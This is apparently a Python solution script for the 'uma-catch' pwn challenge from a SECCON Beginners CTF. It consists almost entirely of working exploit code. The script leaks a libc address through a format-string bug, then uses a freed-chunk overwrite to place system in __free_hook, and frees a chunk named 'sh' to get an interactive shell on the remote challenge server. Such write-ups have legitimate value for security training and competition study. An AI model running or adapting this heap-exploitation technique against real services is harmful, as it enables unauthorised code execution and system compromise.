from ptrlib import *

def catch(index, color):
    print('catch:',index)
    sock.recvuntil("> ")
    sock.sendline('1')
    sock.recvuntil("> ")
    sock.sendline(index)
    sock.recvuntil("> ")
    sock.sendline(color) # bay|chestnut|gray

def naming(index, name):
    print('naming:',index)
    sock.recvuntil("> ")
    sock.sendline('2')
    sock.recvuntil("> ")
    sock.sendline(index)
    sock.recvuntil("> ")
    sock.sendline(name)

def show(index):
    print('show:',index)
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("> ")
    sock.sendline(index)

def dance(index):
    print('dance:',index)
    sock.recvuntil("> ")
    sock.sendline("4")
    sock.recvuntil("> ")
    sock.sendline(index)

def release(index):
    print('release:',index)
    sock.recvuntil("> ")
    sock.sendline("5")
    sock.recvuntil("> ")
    sock.sendline(index)

elf = ELF("./chall")
libc = ELF("./libc-2.27.so")
sock = Socket('nc uma-catch.quals.beginners.seccon.jp 4101')
#sock = Process('./chall')

catch('0', 'chestnut')
naming('0', '%11$p')
show('0')

leak_stack_info = sock.recvline().decode("utf-8") # %11$p
#print(leak_stack_info)
libc_base = int(leak_stack_info, 16) - 0x21BF7
print('[exploit]:libc',hex(libc_base))

free_hook = libc_base + libc.symbol("__free_hook")
gadgets = [0x4f3d5, 0x4f432, 0x10a41c]
one_gadget = libc_base + gadgets[1]
system = libc_base + 0x4f550
print(hex(one_gadget),hex(free_hook),p64(free_hook))

# list[0] is 0x555555558040
# fgets(0x555555559260, 0x20)

release('0')
naming('0', p64(free_hook))

catch('1', 'bay')
naming('1', b'sh\0')

catch('2', 'bay')
naming('2', p64(system))

release('1')
sock.interactive()
